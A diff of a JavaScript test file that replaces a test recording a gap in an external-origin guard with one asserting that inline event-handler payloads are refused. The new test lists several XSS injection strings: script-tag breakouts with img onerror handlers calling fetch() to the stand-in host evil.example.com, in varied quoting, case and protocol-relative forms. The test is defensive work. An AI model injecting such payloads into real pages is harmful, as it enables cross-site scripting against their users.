@@ -74,24 +74,30 @@ test('the CDN rewrite does not launder a smuggled origin', () => {
   assert.ok(!ok.html.includes('d3js.org'));
 });
 
-// ── RECORDED: the shape of the guard ────────────────────────────────────────
+// ── ASSERTED: inline event-handler attributes are caught too ───────────────
 
-test('RECORD: the guard matches fetchable src/href attributes, not inline handlers', () => {
-  // Recorded, not endorsed. `externalOrigins()` reads `src=`/`href=` attribute
-  // URLs only, so the plan's `onerror="fetch('https://…')"` payload is NOT
-  // refused: the URL sits inside an event-handler attribute, not a src/href.
-  //
-  // Why that is contained rather than exploitable today, and what would change
-  // it: (1) bd escapes the title, so the handler never becomes markup at all —
-  // recorded by the bd test below; (2) the graph document is served under
-  // `connect-src 'none'; img-src 'none'` (Task 4), so even as live markup the
-  // fetch and the image load are blocked. If either of those stops holding,
-  // this recorded fact is the place the gap is already written down.
-  const origins = externalOrigins(unescapedPage(HOSTILE_HANDLER));
-  assert.deepEqual(origins, ['d3js.org'], 'evil.example.com is not seen as an origin here');
-  const out = localiseGraphHtml(unescapedPage(HOSTILE_HANDLER));
-  assert.equal(out.rewrote, 1);
-  assert.ok(out.html.includes('evil.example.com'), 'it survives as text — recorded, not approved');
+test('a hostile bead title cannot smuggle an origin through an inline event handler', () => {
+  // Was RECORDED, not endorsed: `externalOrigins()` used to read `src=`/`href=`
+  // attribute URLs only, so `onerror="fetch('https://…')"` sailed through —
+  // the URL sits inside an event-handler attribute, not a src/href. Fixed by
+  // also scanning on*= attributes for absolute and protocol-relative URLs.
+  // Several offender shapes, since a gate that catches only one shape is the
+  // kind of gap this repo has been burned by before: quote choice on both the
+  // attribute and the JS string inside it, handler-name case, and a bare
+  // protocol-relative host with no scheme at all.
+  const offenders = [
+    HOSTILE_HANDLER, // double-quoted attr, single-quoted JS string literal
+    `</script><img src=x onerror='fetch("https://evil.example.com")'>`, // single-quoted attr, double-quoted JS string
+    `</script><img src=x ONERROR="fetch('https://evil.example.com')">`, // uppercase handler name
+    `</script><img src=x onerror="fetch('//evil.example.com')">`, // protocol-relative, no scheme
+  ];
+  for (const payload of offenders) {
+    assert.throws(
+      () => localiseGraphHtml(unescapedPage(payload)),
+      (e) => e.code === 'graph_external_origin',
+      `must refuse: ${payload}`,
+    );
+  }
 });
 
 // ── RECORDED: what bd actually does ─────────────────────────────────────────
